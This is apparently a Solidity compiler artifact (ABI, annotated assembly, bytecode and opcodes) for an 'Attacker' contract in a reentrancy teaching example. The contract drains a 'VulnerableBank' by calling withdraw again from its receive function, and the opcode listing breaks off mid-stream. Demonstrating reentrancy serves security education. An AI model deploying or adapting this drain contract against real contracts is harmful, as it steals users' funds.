{
	"security/ReentrancyExample.sol": {
		"Attacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_bankAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "AMOUNT_TO_DRAIN",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "bank",
					"outputs": [
						{
							"internalType": "contract VulnerableBank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"security/ReentrancyExample.sol\":662:1421  contract Attacker{... */\n  mstore(0x40, 0x80)\n    /* \"security/ReentrancyExample.sol\":786:881  constructor(address _bankAddress){... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"security/ReentrancyExample.sol\":856:868  _bankAddress */\n  dup1\n    /* \"security/ReentrancyExample.sol\":834:838  bank */\n  0x00\n  dup1\n    /* \"security/ReentrancyExample.sol\":834:869  bank = VulnerableBank(_bankAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/ReentrancyExample.sol\":786:881  constructor(address _bankAddress){... */\n  pop\n    /* \"security/ReentrancyExample.sol\":662:1421  contract Attacker{... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"security/ReentrancyExample.sol\":662:1421  contract Attacker{... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/ReentrancyExample.sol\":662:1421  contract Attacker{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x76cdb03b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xf56d2068\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"security/ReentrancyExample.sol\":766:773  1 ether */\n      0x0de0b6b3a7640000\n        /* \"security/ReentrancyExample.sol\":1187:1191  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/ReentrancyExample.sol\":1179:1200  address(bank).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"security/ReentrancyExample.sol\":1179:1219  address(bank).balance >= AMOUNT_TO_DRAIN */\n      lt\n        /* \"security/ReentrancyExample.sol\":1176:1285  if(address(bank).balance >= AMOUNT_TO_DRAIN){... */\n      tag_9\n      jumpi\n        /* \"security/ReentrancyExample.sol\":1239:1243  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/ReentrancyExample.sol\":1239:1252  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"security/ReentrancyExample.sol\":766:773  1 ether */\n      0x0de0b6b3a7640000\n        /* \"security/ReentrancyExample.sol\":1239:1269  bank.withdraw(AMOUNT_TO_DRAIN) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/ReentrancyExample.sol\":1176:1285  if(address(bank).balance >= AMOUNT_TO_DRAIN){... */\n    tag_9:\n        /* \"security/ReentrancyExample.sol\":662:1421  contract Attacker{... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"security/ReentrancyExample.sol\":1310:1414  function getBalance() public view returns(uint) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/ReentrancyExample.sol\":690:716  VulnerableBank public bank */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/ReentrancyExample.sol\":893:1122  function attack() public payable {... */\n    tag_5:\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      stop\n        /* \"security/ReentrancyExample.sol\":727:773  uint public constant AMOUNT_TO_DRAIN = 1 ether */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      pop\n      tag_27\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      tag_29\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/ReentrancyExample.sol\":1310:1414  function getBalance() public view returns(uint) {... */\n    tag_17:\n        /* \"security/ReentrancyExample.sol\":1352:1356  uint */\n      0x00\n        /* \"security/ReentrancyExample.sol\":1380:1401  address(this).balance */\n      selfbalance\n        /* \"security/ReentrancyExample.sol\":1373:1401  return address(this).balance */\n      swap1\n      pop\n        /* \"security/ReentrancyExample.sol\":1310:1414  function getBalance() public view returns(uint) {... */\n      swap1\n      jump\t// out\n        /* \"security/ReentrancyExample.sol\":690:716  VulnerableBank public bank */\n    tag_21:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"security/ReentrancyExample.sol\":893:1122  function attack() public payable {... */\n    tag_25:\n        /* \"security/ReentrancyExample.sol\":766:773  1 ether */\n      0x0de0b6b3a7640000\n        /* \"security/ReentrancyExample.sol\":949:958  msg.value */\n      callvalue\n        /* \"security/ReentrancyExample.sol\":949:977  msg.value == AMOUNT_TO_DRAIN */\n      eq\n        /* \"security/ReentrancyExample.sol\":941:1014  require(msg.value == AMOUNT_TO_DRAIN, \"Send 1 ether to start the attack\") */\n      tag_32\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_33\n      swap1\n      tag_34\n      jump\t// in\n    tag_33:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_32:\n        /* \"security/ReentrancyExample.sol\":1029:1033  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      pop\n      pop\n        /* \"security/ReentrancyExample.sol\":1080:1084  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/ReentrancyExample.sol\":1080:1093  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"security/ReentrancyExample.sol\":766:773  1 ether */\n      0x0de0b6b3a7640000\n        /* \"security/ReentrancyExample.sol\":1080:1110  bank.withdraw(AMOUNT_TO_DRAIN) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_35\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_35:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_36:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_38:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/ReentrancyExample.sol\":893:1122  function attack() public payable {... */\n      jump\t// out\n        /* \"security/ReentrancyExample.sol\":727:773  uint public constant AMOUNT_TO_DRAIN = 1 ether */\n    tag_28:\n        /* \"security/ReentrancyExample.sol\":766:773  1 ether */\n      0x0de0b6b3a7640000\n        /* \"security/ReentrancyExample.sol\":727:773  uint public constant AMOUNT_TO_DRAIN = 1 ether */\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_39:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_40:\n        /* \"#utility.yul\":177:201   */\n      tag_53\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_39\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_11:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_55\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_40\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:568   */\n    tag_41:\n        /* \"#utility.yul\":479:486   */\n      0x00\n        /* \"#utility.yul\":519:561   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":512:517   */\n      dup3\n        /* \"#utility.yul\":508:562   */\n      and\n        /* \"#utility.yul\":497:562   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:568   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":574:634   */\n    tag_42:\n        /* \"#utility.yul\":602:605   */\n      0x00\n        /* \"#utility.yul\":623:628   */\n      dup2\n        /* \"#utility.yul\":616:628   */\n      swap1\n      pop\n        /* \"#utility.yul\":574:634   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":640:782   */\n    tag_43:\n        /* \"#utility.yul\":690:699   */\n      0x00\n        /* \"#utility.yul\":723:776   */\n      tag_59\n        /* \"#utility.yul\":741:775   */\n      tag_60\n        /* \"#utility.yul\":750:774   */\n      tag_61\n        /* \"#utility.yul\":768:773   */\n      dup5\n        /* \"#utility.yul\":750:774   */\n      tag_41\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":741:775   */\n      tag_42\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":723:776   */\n      tag_41\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":710:776   */\n      swap1\n      pop\n        /* \"#utility.yul\":640:782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":788:914   */\n    tag_44:\n        /* \"#utility.yul\":838:847   */\n      0x00\n        /* \"#utility.yul\":871:908   */\n      tag_63\n        /* \"#utility.yul\":902:907   */\n      dup3\n        /* \"#utility.yul\":871:908   */\n      tag_43\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":858:908   */\n      swap1\n      pop\n        /* \"#utility.yul\":788:914   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":920:1067   */\n    tag_45:\n        /* \"#utility.yul\":991:1000   */\n      0x00\n        /* \"#utility.yul\":1024:1061   */\n      tag_65\n        /* \"#utility.yul\":1055:1060   */\n      dup3\n        /* \"#utility.yul\":1024:1061   */\n      tag_44\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1011:1061   */\n      swap1\n      pop\n        /* \"#utility.yul\":920:1067   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1073:1246   */\n    tag_46:\n        /* \"#utility.yul\":1181:1239   */\n      tag_67\n        /* \"#utility.yul\":1233:1238   */\n      dup2\n        /* \"#utility.yul\":1181:1239   */\n      tag_45\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1176:1179   */\n      dup3\n        /* \"#utility.yul\":1169:1240   */\n      mstore\n        /* \"#utility.yul\":1073:1246   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1252:1516   */\n    tag_23:\n        /* \"#utility.yul\":1366:1370   */\n      0x00\n        /* \"#utility.yul\":1404:1406   */\n      0x20\n        /* \"#utility.yul\":1393:1402   */\n      dup3\n        /* \"#utility.yul\":1389:1407   */\n      add\n        /* \"#utility.yul\":1381:1407   */\n      swap1\n      pop\n        /* \"#utility.yul\":1417:1509   */\n      tag_69\n        /* \"#utility.yul\":1506:1507   */\n      0x00\n        /* \"#utility.yul\":1495:1504   */\n      dup4\n        /* \"#utility.yul\":1491:1508   */\n      add\n        /* \"#utility.yul\":1482:1488   */\n      dup5\n        /* \"#utility.yul\":1417:1509   */\n      tag_46\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":1252:1516   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1522:1691   */\n    tag_47:\n        /* \"#utility.yul\":1606:1617   */\n      0x00\n        /* \"#utility.yul\":1640:1646   */\n      dup3\n        /* \"#utility.yul\":1635:1638   */\n      dup3\n        /* \"#utility.yul\":1628:1647   */\n      mstore\n        /* \"#utility.yul\":1680:1684   */\n      0x20\n        /* \"#utility.yul\":1675:1678   */\n      dup3\n        /* \"#utility.yul\":1671:1685   */\n      add\n        /* \"#utility.yul\":1656:1685   */\n      swap1\n      pop\n        /* \"#utility.yul\":1522:1691   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1697:1879   */\n    tag_48:\n        /* \"#utility.yul\":1837:1871   */\n      0x53656e64203120657468657220746f207374617274207468652061747461636b\n        /* \"#utility.yul\":1833:1834   */\n      0x00\n        /* \"#utility.yul\":1825:1831   */\n      dup3\n        /* \"#utility.yul\":1821:1835   */\n      add\n        /* \"#utility.yul\":1814:1872   */\n      mstore\n        /* \"#utility.yul\":1697:1879   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1885:2251   */\n    tag_49:\n        /* \"#utility.yul\":2027:2030   */\n      0x00\n        /* \"#utility.yul\":2048:2115   */\n      tag_73\n        /* \"#utility.yul\":2112:2114   */\n      0x20\n        /* \"#utility.yul\":2107:2110   */\n      dup4\n        /* \"#utility.yul\":2048:2115   */\n      tag_47\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2041:2115   */\n      swap2\n      pop\n        /* \"#utility.yul\":2124:2217   */\n      tag_74\n        /* \"#utility.yul\":2213:2216   */\n      dup3\n        /* \"#utility.yul\":2124:2217   */\n      tag_48\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2242:2244   */\n      0x20\n        /* \"#utility.yul\":2237:2240   */\n      dup3\n        /* \"#utility.yul\":2233:2245   */\n      add\n        /* \"#utility.yul\":2226:2245   */\n      swap1\n      pop\n        /* \"#utility.yul\":1885:2251   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2257:2676   */\n    tag_34:\n        /* \"#utility.yul\":2423:2427   */\n      0x00\n        /* \"#utility.yul\":2461:2463   */\n      0x20\n        /* \"#utility.yul\":2450:2459   */\n      dup3\n        /* \"#utility.yul\":2446:2464   */\n      add\n        /* \"#utility.yul\":2438:2464   */\n      swap1\n      pop\n        /* \"#utility.yul\":2510:2519   */\n      dup2\n        /* \"#utility.yul\":2504:2508   */\n      dup2\n        /* \"#utility.yul\":2500:2520   */\n      sub\n        /* \"#utility.yul\":2496:2497   */\n      0x00\n        /* \"#utility.yul\":2485:2494   */\n      dup4\n        /* \"#utility.yul\":2481:2498   */\n      add\n        /* \"#utility.yul\":2474:2521   */\n      mstore\n        /* \"#utility.yul\":2538:2669   */\n      tag_76\n        /* \"#utility.yul\":2664:2668   */\n      dup2\n        /* \"#utility.yul\":2538:2669   */\n      tag_49\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2530:2669   */\n      swap1\n      pop\n        /* \"#utility.yul\":2257:2676   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f77ec201caea8067445c8c4502d2398f35ab8a43deab76f2724125bf0440c42764736f6c63430008180033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b50604051610540380380610540833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6104348061010c5f395ff3fe608060405260043610610042575f3560e01c806312065fe01461012057806376cdb03b1461014a5780639e5faafc14610174578063f56d20681461017e5761011c565b3661011c57670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061011a575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016100ec91906102da565b5f604051808303815f87803b158015610103575f80fd5b505af1158015610115573d5f803e3d5ffd5b505050505b005b5f80fd5b34801561012b575f80fd5b506101346101a8565b60405161014191906102da565b60405180910390f35b348015610155575f80fd5b5061015e6101af565b60405161016b919061036d565b60405180910390f35b61017c6101d2565b005b348015610189575f80fd5b506101926102b6565b60405161019f91906102da565b60405180910390f35b5f47905090565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a7640000341461021c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610213906103e0565b60405180910390fd5b5f8054906101000a9050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161028791906102da565b5f604051808303815f87803b15801561029e575f80fd5b505af11580156102b0573d5f803e3d5ffd5b50505050565b670de0b6b3a764000081565b5f819050919050565b6102d4816102c2565b82525050565b5f6020820190506102ed5f8301846102cb565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61033561033061032b846102f3565b610312565b6102f3565b9050919050565b5f6103468261031b565b9050919050565b5f6103578261033c565b9050919050565b6103678161034d565b82525050565b5f6020820190506103805f83018461035e565b92915050565b5f82825260208201905092915050565b7f53656e64203120657468657220746f207374617274207468652061747461636b5f82015250565b5f6103ca602083610386565b91506103d582610396565b602082019050919050565b5f6020820190508181035f8301526103f7816103be565b905091905056fea2646970667358221220f77ec201caea8067445c8c4502d2398f35ab8a43deab76f2724125bf0440c42764736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x540 CODESIZE SUB DUP1 PUSH2 0x540 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x434 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x120 JUMPI DUP1 PUSH4 0x76CDB03B EQ PUSH2 0x14A JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x174 JUMPI DUP1 PUSH4 0xF56D2068 EQ PUSH2 0x17E JUMPI PUSH2 0x11C JUMP JUMPDEST CALLDATASIZE PUSH2 0x11C JUMPI PUSH8 0xDE0B6B3A7640000 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x11A JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEC SWAP2 SWAP1 PUSH2 0x2DA JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x103 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x115 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x12B JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x134 PUSH2 0x1A8 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x141 SWAP2 SWAP1 PUSH2 0x2DA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x155 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x15E PUSH2 0x1AF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x16B SWAP2 SWAP1 PUSH2 